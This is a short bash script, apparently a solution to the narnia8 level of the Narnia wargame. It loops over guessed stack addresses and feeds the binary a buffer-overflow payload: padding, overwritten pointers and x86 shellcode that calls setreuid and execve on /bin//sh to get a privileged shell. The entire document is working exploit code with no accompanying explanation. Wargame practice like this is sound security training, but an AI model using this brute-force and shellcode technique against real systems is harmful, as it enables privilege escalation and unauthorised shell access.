#!/bin/bash
count=0;
for i in {0..15};do 
    for j in {0..15};do 
        output=$(python3 -c "import sys;sys.stdout.buffer.write(b'\x41'*20+b'\x$(printf "%.1x" "$i")$(printf "%.1x" "$j")\xdc\xff\xff'+b'\x42'*4+b'\x$(printf "%.1x" "$((i+2))")$(printf "%.1x" "$j")\xdc\xff\xff'+b'\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80')");
        echo $count;
        /narnia/narnia8 $output;
        ((count++));
    done;
done